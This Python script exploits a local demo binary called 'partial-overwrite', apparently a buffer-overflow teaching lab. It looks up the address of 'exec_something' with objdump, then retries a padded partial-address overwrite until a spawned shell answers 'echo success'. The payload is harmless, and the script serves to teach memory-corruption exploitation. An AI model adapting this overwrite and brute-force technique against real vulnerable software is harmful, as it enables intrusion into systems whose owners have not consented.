#!/usr/bin/env python3
import subprocess
import sys
import os
import os.path

def encode_into_chars(hex_value):
    result = []

    for i in range(0, len(hex_value) // 2):
        p = hex_value[2 * i] + hex_value[2 * i + 1]
        i = int(p, 16)
        result.append(i.to_bytes(1, "little"))

    return b"".join(result)

def run_objdump():
    proc = subprocess.Popen(["/usr/bin/objdump", "-S", "./partial-overwrite"], stdout = subprocess.PIPE, stderr = subprocess.PIPE)
    out, err = proc.communicate()
    assert(proc.returncode == 0)
    return out.decode("ascii", "ignore") + err.decode("ascii", "ignore")

def run_overflow(byte_addr):
    pad_size  = 16
    pad       = bytearray(b"\xCD" * pad_size)
    byte_addr = bytes(reversed(byte_addr))

    commands = [
        "echo success",
        "exit 0"
    ]

    proc     = subprocess.Popen([b"./partial-overwrite", b"overflow:" + pad + byte_addr], stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
    out, err = proc.communicate("\n".join(commands).encode("u8", "ignore"))
    res      = out.decode("ascii", "ignore") + err.decode("ascii", "ignore")

    return ("success" in res and proc.returncode == 0, res)

def strip_leading_zeroes(string):
    lst = list(string)

    while lst[0] == "0":
        lst.pop(0)

    return "".join(lst)

def get_addr_of(symbol):
    lines = run_objdump().split("\n")
    lines = [line for line in lines if len(line) > 0 and not line[0].isspace() and symbol in line]
    line = lines[0]
    address = line.split(" ")[0]
    return strip_leading_zeroes(address)

def main():
    if not os.path.exists("./partial-overwrite"):
        os.system("make")

    address         = get_addr_of("exec_something")
    encoded_address = encode_into_chars(address)
    print("exec_something address is", address, "->", encoded_address)
    print("now starting.")
    print()

    num_attempts = 1

    while True:
        success, out = run_overflow(encoded_address)

        if success:
            print(out)
            break

        num_attempts += 1

    print("succeeded in", num_attempts, "attempt(s).")

main()
